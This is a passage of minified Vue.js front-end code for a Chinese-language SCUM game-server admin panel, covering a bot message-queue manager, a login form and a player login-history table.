t.stop()}}),t,null,[[4,12]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},finishQueueItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e,status:"fullfilled"},i.prev=1,i.next=4,f({method:"PUT",url:"/queueAdminSys/updateStatus",data:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getQueueList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},finishQueueItems:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={ids:e.selectedRowKeys,status:"fullfilled"},t.prev=1,t.next=4,f({method:"PUT",url:"/queueAdminSys/updateQueuesStatus",data:i});case 4:null!=(r=t.sent)&&null!==(a=r.data)&&void 0!==a&&null!==(n=a.failIds)&&void 0!==n&&n.length?e.$message.warning("成功".concat(null==r||null===(o=r.data)||void 0===o?void 0:o.success,"个，以下ID更新出错: ").concat(null==r||null===(s=r.data)||void 0===s||null===(l=s.failIds)||void 0===l?void 0:l.join(","))):e.$message.success("操作成功"),e.getQueueList(),t.next=12;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[1,9]])})))()},redoQueueItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"POST",url:"/queueAdminSys/redo",data:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getQueueList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},redoQueueItems:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={ids:e.selectedRowKeys},t.prev=1,t.next=4,f({method:"POST",url:"/queueAdminSys/redoQueues",data:i});case 4:null!=(r=t.sent)&&null!==(a=r.data)&&void 0!==a&&null!==(n=a.failIds)&&void 0!==n&&n.length?e.$message.warning("成功".concat(null==r||null===(o=r.data)||void 0===o?void 0:o.success,"个，以下ID重发出错: ").concat(null==r||null===(s=r.data)||void 0===s||null===(l=s.failIds)||void 0===l?void 0:l.join(","))):e.$message.success("操作成功"),e.getQueueList(),t.next=12;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[1,9]])})))()},deleteQueueItem:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a={id:e},i.prev=1,i.next=4,f({method:"DELETE",url:"/queueAdminSys/delete",params:a});case 4:200===i.sent.status&&(t.$message.success("操作成功"),t.getQueueList()),i.next=11;break;case 8:i.prev=8,i.t0=i.catch(1),console.error(i.t0);case 11:case"end":return i.stop()}}),i,null,[[1,8]])})))()},deleteQueueItems:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o,s,l;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={ids:e.selectedRowKeys},t.prev=1,t.next=4,f({method:"DELETE",url:"/queueAdminSys/deleteQueues",data:i});case 4:null!=(r=t.sent)&&null!==(a=r.data)&&void 0!==a&&null!==(n=a.failIds)&&void 0!==n&&n.length?e.$message.warning("成功".concat(null==r||null===(o=r.data)||void 0===o?void 0:o.success,"个，以下ID删除出错: ").concat(null==r||null===(s=r.data)||void 0===s||null===(l=s.failIds)||void 0===l?void 0:l.join(","))):e.$message.success("操作成功"),e.getQueueList(),t.next=12;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[1,9]])})))()},finishAllQueue:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return i={status:"fullfilled"},t.prev=1,e.finishLoading=!0,t.next=5,f({method:"PUT",url:"/queueAdminSys/updateAllStatus",data:i});case 5:200===t.sent.status&&(e.finishLoading=!1,e.$message.success("操作成功"),e.getQueueList()),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),e.finishLoading=!1,console.error(t.t0);case 13:case"end":return t.stop()}}),t,null,[[1,9]])})))()},cleanQueue:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/queueAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getQueueList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}},vt=yt,xt=Object(S.a)(vt,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"机器人消息队列"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():[i("a-button",{attrs:{size:"small",icon:"plus"},on:{click:function(t){e.showAddQueueItemModal=!0}}},[e._v("添加消息")]),i("a-dropdown",[i("a-menu",{attrs:{slot:"overlay"},slot:"overlay"},[i("a-menu-item",{on:{click:function(t){return e.changeRobotChannel("solo")}}},[e._v("切换机器人聊天频道 (单机器人模式)")]),i("a-menu-item",{on:{click:function(t){return e.changeRobotChannel("multi","single")}}},[e._v("切换机器人聊天频道 (双机器人模式 - 一号)")]),i("a-menu-item",{on:{click:function(t){return e.changeRobotChannel("multi","double")}}},[e._v("切换机器人聊天频道 (双机器人模式 - 二号)")]),i("a-menu-item",{on:{click:function(t){e.changeMultiRobotChannelModal=!0}}},[e._v("切换机器人聊天频道 (多个机器人模式 - n号)")])],1),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"api",loading:e.changeRobotChannelLoading}},[e._v("切换机器人聊天频道"),i("a-icon",{attrs:{type:"down"}})],1)],1),i("a-popconfirm",{attrs:{placement:"right",title:"确定要全部标记为已完成吗"},on:{confirm:e.finishAllQueue}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"check-circle",loading:e.finishLoading}},[e._v("全部标记为已完成")])],1),"sysAdmin"===e.userInfo.role?i("a-popconfirm",{attrs:{placement:"right",title:"确定要清空机器人消息队列吗"},on:{confirm:e.cleanQueue}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"delete",type:"danger",loading:e.cleanLoading}},[e._v("清空机器人消息队列")])],1):e._e()],i("a-modal",{attrs:{title:"添加消息","mask-closable":!1,width:600},on:{cancel:function(){e.addQueueItemForm.type="",e.addQueueItemForm.commands="",e.addQueueItemForm.buyId=""}},model:{value:e.showAddQueueItemModal,callback:function(t){e.showAddQueueItemModal=t},expression:"showAddQueueItemModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.addQueueItemLoading},on:{click:e.submitAddQueueItem}},[e._v("提交")])],1),e.showAddQueueItemModal?i("a-form-model",{ref:"addQueueItemForm",staticStyle:{"max-width":"500px"},attrs:{model:e.addQueueItemForm,rules:e.addQueueItemRules,"label-col":{span:6},"wrapper-col":{span:18}}},[i("a-form-model-item",{attrs:{label:"消息类型",prop:"type"}},[i("a-select",{model:{value:e.addQueueItemForm.type,callback:function(t){e.$set(e.addQueueItemForm,"type",t)},expression:"addQueueItemForm.type"}},e._l(e.queueTypeKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{label:t}},[e._v(e._s(t))])})),1)],1),i("a-form-model-item",{attrs:{prop:"commands"}},[i("template",{slot:"label"},[i("span",[e._v("消息/命令")]),i("a-tooltip",{attrs:{placement:"top",title:"每一条消息/命令使用回车键换行隔开(特殊命令: <ctrl-a> - 全选; <x> - 按下X键; <ctrl-c> - 复制; <ctrl-v> - 粘贴; <enter> - 回车; <tab> / <tab-n> - tab键; <clean-didi-vehicles> - 清空滴滴车)"}},[i("a-icon",{staticStyle:{"margin-left":"5px",transform:"translateY(13px)",cursor:"pointer"},attrs:{type:"info-circle",theme:"filled"}})],1)],1),i("div",{staticStyle:{width:"100%",position:"relative"}},[i("a-input",{attrs:{type:"textarea","auto-size":{minRows:6,maxRows:6}},model:{value:e.addQueueItemForm.commands,callback:function(t){e.$set(e.addQueueItemForm,"commands",t)},expression:"addQueueItemForm.commands"}}),i("commands-picker",{on:{select:function(t,i){e.addQueueItemForm.commands=e.addQueueItemForm.commands+(e.addQueueItemForm.commands.length?"\n":"")+t+("number"==typeof i&&i>=2?i<=10?" "+i:" 10":""),e.$refs.addQueueItemForm.validateField("commands")}}})],1)],2),i("a-form-model-item",{attrs:{label:"关联订单ID",prop:"buyId",rules:{required:"buyMsg"===e.addQueueItemForm.type,trigger:"change",message:"消息类型为订单播报时必填",validator:function(t,i,a){"buyMsg"===e.addQueueItemForm.type&&i&&i.length||"buyMsg"!==e.addQueueItemForm.type?a():a(new e.Error("消息类型为订单播报时必填"))}}}},[i("a-input",{model:{value:e.addQueueItemForm.buyId,callback:function(t){e.$set(e.addQueueItemForm,"buyId",t)},expression:"addQueueItemForm.buyId"}})],1)],1):e._e()],2),i("a-modal",{attrs:{title:"切换机器人聊天频道编辑","mask-closable":!1,width:600},on:{cancel:function(){e.changeMultiRobotChannelNumber=1}},model:{value:e.changeMultiRobotChannelModal,callback:function(t){e.changeMultiRobotChannelModal=t},expression:"changeMultiRobotChannelModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.addQueueItemLoading},on:{click:function(){e.changeMultiRobotChannelModal=!1,e.changeRobotChannel("multi-n",e.changeMultiRobotChannelNumber),e.changeMultiRobotChannelNumber=1}}},[e._v("提交")])],1),i("div",[i("span",[e._v("对")]),i("a-input-number",{staticStyle:{width:"100px",margin:"0 10px"},attrs:{min:1},model:{value:e.changeMultiRobotChannelNumber,callback:function(t){e.changeMultiRobotChannelNumber=t},expression:"changeMultiRobotChannelNumber"}}),i("span",[e._v("号机器人切换聊天频道")])],1)],2)],2)]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onQueueListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onQueueListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")]),e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&e.selectedRowKeys.length>0?i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除选中的消息/命令吗"},on:{confirm:function(){return e.deleteQueueItems()}}},[e.userInfo&&"sysAdmin"===e.userInfo.role&&e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",type:"danger",icon:"delete"}},[e._v("删除选中")]):e._e()],1):e._e(),e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"check-circle"},on:{click:function(){return e.finishQueueItems()}}},[e._v("标记选中为完成")]):e._e(),e.userInfo&&("sysAdmin"===e.userInfo.role||"admin"===e.userInfo.role)&&e.selectedRowKeys.length>0?i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small",icon:"redo"},on:{click:function(){return e.redoQueueItems()}}},[e._v("重试选中")]):e._e()],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block"}},[e._v("消息类型:")]),i("a-select",{staticStyle:{width:"300px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.queueListFilter.type,callback:function(t){e.$set(e.queueListFilter,"type",t)},expression:"queueListFilter.type"}},e._l(e.queueTypeKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("执行状态:")]),i("a-select",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{allowClear:""},model:{value:e.queueListFilter.status,callback:function(t){e.$set(e.queueListFilter,"status",t)},expression:"queueListFilter.status"}},e._l(e.queueStatusKeyValue,(function(t,a){return i("a-select-option",{key:a,attrs:{title:t}},[e._v(e._s(t))])})),1),i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("关联订单ID:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"10px"},attrs:{placeholder:"模糊匹配",allowClear:""},model:{value:e.queueListFilter.buyId,callback:function(t){e.$set(e.queueListFilter,"buyId",t)},expression:"queueListFilter.buyId"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"80px","text-align":"right",display:"inline-block"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.queueListFilter.timestampStart,e.queueListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.queueListFilter,"timestampStart",t[0]),e.$set(e.queueListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.queueListColumns,"data-source":e.queueListData,expandedRowKeys:e.expandedQueueIds,"row-key":"id",pagination:!1,loading:e.loadingQueueListTable,bordered:"",scroll:{x:"100%"},size:"small","row-selection":{selectedRowKeys:e.selectedRowKeys,onChange:function(t){e.selectedRowKeys=t}}},on:{expand:function(t,i){if(t)void 0===e.expandedQueueIds.find((function(e){return e===i.id}))&&e.expandedQueueIds.push(i.id);else{var a=Object.keys(e.expandedQueueIds).find((function(t){return e.expandedQueueIds[t]===i.id}));void 0!==a&&e.expandedQueueIds.splice(a,1)}}},scopedSlots:e._u([{key:"commands",fn:function(t,a){return[i("div",{staticStyle:{"text-overflow":"ellipsis","overflow-x":"hidden","white-space":"nowrap"},style:{cursor:void 0===e.expandedQueueIds.find((function(e){return e===a.id}))?"pointer":"auto"},attrs:{title:void 0===e.expandedQueueIds.find((function(e){return e===a.id}))?t+"\n【点击展开】":t},on:{click:function(t){void 0===e.expandedQueueIds.find((function(e){return e===a.id}))&&e.expandedQueueIds.push(a.id)}}},[e._v(" "+e._s(t)+" ")])]}},{key:"type",fn:function(t){return[i("span",[e._v(e._s(e.queueTypeKeyValue[t]?e.queueTypeKeyValue[t]:t))])]}},{key:"status",fn:function(t){return[i("span",[e.queueStatusBadgeKeyValue[t]?i("a-badge",{attrs:{status:e.queueStatusBadgeKeyValue[t]}}):e._e(),i("span",[e._v(e._s(e.queueStatusKeyValue[t]?e.queueStatusKeyValue[t]:t))])],1)]}},{key:"buyId",fn:function(t){return[t?i("div",{staticStyle:{"margin-bottom":"-5px"}},e._l(t.split(", "),(function(t){return i("a-tag",{key:t,staticStyle:{color:"#1890ff",cursor:"pointer","max-width":"100%","text-overflow":"ellipsis",overflow:"hidden"},on:{click:function(){return e.$router.push({path:"/buy",query:{id:t}})}}},[e._v(e._s(t))])})),1):e._e()]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"updateTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"expandedRowRender",fn:function(t){return i("div",{staticStyle:{margin:"0"}},[e.expandedQueueIds.find((function(e){return e===t.id}))?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("操作")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("div",{staticStyle:{width:"100%",height:"38px","padding-top":"5px","padding-left":"10px"}},[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?i("sapn",[e._v("暂无可用操作")]):[i("a-button",{attrs:{size:"small",icon:"check-circle"},on:{click:function(){return e.finishQueueItem(t.id)}}},[e._v("标记为完成")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"redo"},on:{click:function(){return e.redoQueueItem(t.id)}}},[e._v("重试")]),i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除该消息/命令吗"},on:{confirm:function(){return e.deleteQueueItem(t.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"danger",size:"small",icon:"delete"}},[e._v("删除")])],1)]],2),i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 135px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("消息内容")]),i("div",{staticStyle:{width:"125px",height:"24px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[i("a-button",{attrs:{size:"small",icon:"copy"},on:{click:function(){return e.doCopyCommands(t.commands)}}},[e._v("复制到剪贴板")])],1)]),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("pre",{staticStyle:{width:"100%",height:"auto","padding-left":"10px"},domProps:{innerHTML:e._s(t.commands.replace(/\n/g,"\\n<br>").replace(/\r/g,"\\r<br>"))}}),t.configs&&t.configs.matchedLimitaions&&t.configs.matchedLimitaions.length?[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"auto",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top"}},[e._v("匹配的传送限制策略")])]),i("a-divider",{staticStyle:{margin:"5px 0"}}),e._l(t.configs.matchedLimitaions,(function(t,a){return i("div",{key:a,staticStyle:{width:"100%",border:"1px #aaaaaa dashed","border-radius":"4px",padding:"10px"},style:{marginTop:a?"10px":"0"}},[i("div",[i("strong",[e._v("第"+e._s(a+1)+"个:")])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px"}},[i("span",[e._v("限制类型:")]),i("strong",{staticStyle:{"margin-left":"10px"}},[e._v(e._s("teleportFrom"===t.type?"传送人所在坐标":"传送目的坐标"))])]),i("div",{staticStyle:{width:"100%","line-height":"30px",height:"30px"}},[i("span",[e._v("匹配等级:")]),i("strong",{staticStyle:{"margin-left":"10px"}},[e._v(e._s(t.vips.join(", ")))])]),i("div",{staticStyle:{width:"100%"}},[i("div",{staticStyle:{width:"70px","line-height":"30px",height:"30px",display:"inline-block","vertical-align":"top"}},[e._v("坐标范围:")]),e._l(t.ranges,(function(t,a){return i("div",{key:a,staticStyle:{width:"calc(100% - 70px)","line-height":"30px",height:"30px",display:"inline-block","vertical-align":"top"}},[i("strong",[e._v("第"+e._s(a+1)+"个:")]),i("span",{staticStyle:{"margin-left":"10px"}},[e._v("从 "),i("strong",[e._v("X="+e._s(t.fromXY.x)+", X="+e._s(t.fromXY.y))]),e._v(" 到 "),i("strong",[e._v("X="+e._s(t.toXY.x)+", X="+e._s(t.toXY.y))])])])}))],2)])}))]:e._e()]:e._e()],2)}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.queueListPagination.pageSize,current:e.queueListPagination.pageNum,total:e.queueListPagination.total},on:{change:e.onChangeQueueListPagination,showSizeChange:e.onShowSizeChangeQueueListPagination}})],1)])],1)}),[],!1,null,"b7446f10",null),bt=xt.exports,St={name:"Login",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),mounted:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,e.checkLogin();case 2:case"end":return t.stop()}}),t)})))()},data:function(){return{backgroundImgUrl:"".concat(window.BACKEND_HOST,"/image/getOldImg?originalPath=https://i1.fuimg.com/734277/df648dc59c39fbf4.jpg"),submitLogin:!1,loginForm:{user:"",password:""},rules:{user:[{required:!0,trigger:"change",message:"请输入用户手机号(+国际区号，中国: +86)",validator:function(e,t,i){t&&t.length?i():i(new Error("请输入用户手机号(+国际区号，中国: +86)"))}}],password:[{required:!0,trigger:"change",message:"请输入密码",validator:function(e,t,i){t&&t.length?i():i(new Error("请输入密码"))}}]}}},methods:{checkLogin:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,f({method:"GET",url:"/authAdminSys/checkValid"});case 3:200===(i=t.sent).status&&i.data&&i.data.result&&e.$router.push({path:"/"}),t.next=10;break;case 7:t.prev=7,t.t0=t.catch(0),console.log(t.t0);case 10:case"end":return t.stop()}}),t,null,[[0,7]])})))()},login:function(){var e=this;this.$refs.loginForm.validate((function(t){if(t){var i=e.loginForm;i.user.startsWith("+")||(i.user="+86"+i.user),e.submitLogin=!0,f({method:"POST",url:"/authAdminSys/login",data:i}).then((function(t){e.submitLogin=!1,200===t.status&&e.$router.push({path:"/user"})})).error((function(t){console.log(t),e.submitLogin=!1}))}}))}}},wt=St,Lt=Object(S.a)(wt,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("div",{staticStyle:{position:"absolute",width:"100%",height:"100%","background-repeat":"no-repeat","background-size":"100% 100%",opacity:"40%"},style:{backgroundImage:"url("+e.backgroundImgUrl+")"}}),i("div",{staticStyle:{position:"absolute",width:"100%",height:"100%",display:"table"}},[i("div",{staticStyle:{width:"100%",display:"table-cell","vertical-align":"middle"}},[i("div",{staticStyle:{display:"inline-block","text-align":"center",width:"100%"}},[i("a-card",{staticStyle:{width:"75%","max-width":"500px","min-height":"270px","border-radius":"4px",display:"inline-block"},attrs:{bordered:!0}},[i("div",{staticStyle:{"font-weight":"bolder","text-align":"left"},attrs:{slot:"title"},slot:"title"},[e._v("登录")]),i("a-form-model",{ref:"loginForm",attrs:{model:e.loginForm,rules:e.rules,"label-col":{span:6},"wrapper-col":{span:14}}},[i("a-form-model-item",{attrs:{label:"手机号",prop:"user"}},[i("a-input",{attrs:{placeholder:"请输入用户手机号(+国际区号，中国: +86)"},model:{value:e.loginForm.user,callback:function(t){e.$set(e.loginForm,"user",t)},expression:"loginForm.user"}})],1),i("a-form-model-item",{attrs:{label:"密码",prop:"password"}},[i("a-input",{attrs:{type:"password"},model:{value:e.loginForm.password,callback:function(t){e.$set(e.loginForm,"password",t)},expression:"loginForm.password"}})],1)],1),i("div",{staticStyle:{width:"100%","margin-top":"20px","text-align":"center"}},[i("a-button",{attrs:{type:"primary",loading:e.submitLogin},on:{click:e.login}},[e._v("提交")])],1)],1)],1)])])])}),[],!1,null,"61bc88bd",null),kt=Lt.exports,It=(i("498a"),{name:"All",components:{MapLocations:J},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,loadingUserLoginListTable:!1,userLoginListFilter:{type:void 0,steamId:void 0,scumId:void 0,userName:void 0,timestampStart:void 0,timestampEnd:void 0},userLoginListColumns:[{title:"Steam ID",key:"steamId",dataIndex:"steamId",width:150,align:"center",scopedSlots:{customRender:"steamId"}},{title:"SCUM玩家名称",key:"scumId",dataIndex:"scumId",width:160,align:"center",scopedSlots:{customRender:"scumId"}},{title:"登录时间",key:"loginTimeStamp",dataIndex:"loginTimeStamp",width:150,align:"center",scopedSlots:{customRender:"loginTimeStamp"}},{title:"登出时间",key:"logoutTimeStamp",dataIndex:"logoutTimeStamp",width:150,align:"center",scopedSlots:{customRender:"logoutTimeStamp"}},{title:"登录状态",key:"status",dataIndex:"status",width:80,align:"center",scopedSlots:{customRender:"status"}},{title:"玩家登录IP地址",key:"loginIp",dataIndex:"loginIp",width:150,align:"center",scopedSlots:{customRender:"loginIp"}},{title:"Session ID",key:"sessionId",dataIndex:"sessionId",width:90,align:"center",scopedSlots:{customRender:"sessionId"}}],userLoginListData:[],userLoginListPagination:{pageSize:20,pageNum:1,total:0},typeList:[{value:"login",label:"登录",color:"green"},{value:"logout",label:"退出",color:"grey"}],expandedUserLoginIds:[],selectedRowKeys:[]}},mounted:function(){this.getUserLoginList()},methods:{onUserLoginListCleanFilter:function(){var e=this;this.userLoginListPagination.pageNum=1,this.$nextTick((function(){e.getUserLoginList(!0)}))},onUserLoginListFilter:function(){var e=this;this.userLoginListPagination.pageNum=1,this.$nextTick((function(){e.getUserLoginList()}))},onChangeUserLoginListPagination:function(e){var t=this;this.userLoginListPagination.pageNum=e,this.$nextTick((function(){t.getUserLoginList()}))},onShowSizeChangeUserLoginListPagination:function(e,t){var i=this;this.userLoginListPagination.pageNum=1,this.userLoginListPagination.pageSize=t,this.$nextTick((function(){i.getUserLoginList()}))},getUserLoginList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.userLoginListPagination,n=a.pageNum,r=a.pageSize,e?(t.userLoginListFilter={type:void 0,steamId:void 0,scumId:void 0,createdArea:void 0,trapName:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.userLoginListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingUserLoginListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/userAdminSys/listUserLogin",params:o});case 6:c=i.sent,t.loadingUserLoginListTable=!1,200===c.status&&(t.userLoginListPagination.total=c.data.count,t.userLoginListData=c.data.list),t.selectedRowKeys=[],i.next=16;break;case 12:i.prev=12,i.t0=i.catch(3),console.error(i.t0),t.loadingUserLoginListTable=!1;case 16:case"end":return i.stop()}}),i,null,[[3,12]])})))()},doCopyCommands:function(e){var t=this;this.$copyText(e).then((function(e){t.$message.success("已复制到剪贴板")}),(function(e){t.$message.error("复制失败"),console.log("复制失败：",e)}))},doCopyCommandsMulti:function(){var e=this,t=this.userLoginListData.filter((function(t){return e.selectedRowKeys.includes(t.id)})).map((function(e){return e.rawText})).filter((function(e){var t;return(null==e||null===(t=e.trim())||void 0===t?void 0:t.length)>0})).join("\n");this.$copyText(t).then((function(t){e.$message.success("已复制到剪贴板")}),(function(t){e.$message.error("复制失败"),console.log("复制失败：",t)}))},cleanUserLogin:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/userAdminSys/cleanAllUserLogin"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getUserLoginList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()}}}),_t=It,Tt=Object(S.a)(_t,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("div",{staticStyle:{width:"100%",height:"calc(100% - 